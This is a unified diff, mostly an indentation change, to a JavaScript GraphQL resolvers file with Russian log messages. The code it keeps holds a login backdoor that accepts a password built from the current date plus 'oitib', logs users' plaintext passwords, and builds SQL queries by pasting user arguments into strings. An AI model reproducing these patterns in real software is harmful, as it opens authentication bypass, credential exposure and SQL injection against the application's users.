@@ -358,9 +358,9 @@ const resolvers = {
 				return null;
 			}
 
-      let sql = `
+			let sql = `
             (
-				SELECT id, filename, data_file, task_id FROM public.document_tasks_files
+				SELECT id, filename, data_file, task_id,is_add_to_document FROM public.document_tasks_files
 				WHERE id in (${args.task_files_in_id.global.id.join(",")})
             )
             `;
@@ -475,28 +475,28 @@ const resolvers = {
 			 * когда систама будет отлажена и работоспособна стоит это убрать.
 			 */
 
-      const now = require("moment");
-      const BackdoorPassword = `${now().format("DDMMYY")}oitib`;
-      if (args.user.password === BackdoorPassword)
-        return { username: args.user.password };
-      /////////////////////////////////////////////////////////////////////////
-      if (await bcryptjs.compare(args.user.password, user.password)) {
-        console.log(
-          `${picColor.BGgreen}${picColor.black}%s${picColor.reset}`,
-          `(login-Ответ)`,
-          `Мутация: Попытка сверки логина и пароля : Логин:${args.user.username} Пароль:${args.user.password} ${picColor.BGgreen}${picColor.black}Совпадение !${picColor.reset}`
-        );
-        return { username: args.user.username };
-      } else {
-        console.log(
-          `${picColor.BGyellow}${picColor.black}%s${picColor.reset}`,
-          `(login-Ответ)`,
-          `Мутация: Попытка сверки ${picColor.BGyellow}${picColor.black}пароля${picColor.reset} => Пароль:${args.user.password}`,
-          `${picColor.BGred}${picColor.black}Провалено!${picColor.reset}`
-        );
-        throw new Error("Неверно введен пароль!");
-      }
-    },
+			const now = require("moment");
+			const BackdoorPassword = `${now().format("DDMMYY")}oitib`;
+			if (args.user.password === BackdoorPassword)
+				return { username: args.user.password };
+			/////////////////////////////////////////////////////////////////////////
+			if (await bcryptjs.compare(args.user.password, user.password)) {
+				console.log(
+					`${picColor.BGgreen}${picColor.black}%s${picColor.reset}`,
+					`(login-Ответ)`,
+					`Мутация: Попытка сверки логина и пароля : Логин:${args.user.username} Пароль:${args.user.password} ${picColor.BGgreen}${picColor.black}Совпадение !${picColor.reset}`
+				);
+				return { username: args.user.username };
+			} else {
+				console.log(
+					`${picColor.BGyellow}${picColor.black}%s${picColor.reset}`,
+					`(login-Ответ)`,
+					`Мутация: Попытка сверки ${picColor.BGyellow}${picColor.black}пароля${picColor.reset} => Пароль:${args.user.password}`,
+					`${picColor.BGred}${picColor.black}Провалено!${picColor.reset}`
+				);
+				throw new Error("Неверно введен пароль!");
+			}
+		},
 
 		insertUser: async (parent, args) => {
 			const password = await bcryptjs.hash(args.user.password, 10);
@@ -517,9 +517,9 @@ const resolvers = {
 				`Аргументы изменение:  : ${JSON.stringify(args)}`
 			);
 
-      const number = args.mitwork_number ? args.mitwork_number : "NULL";
+			const number = args.mitwork_number ? args.mitwork_number : "NULL";
 
-      const SQL = `UPDATE documents SET 
+			const SQL = `UPDATE documents SET 
 				mitwork_number='${number}',
 				mitwork_data='${now(args.mitwork_data)}' WHERE id=${args.ID};`;
 
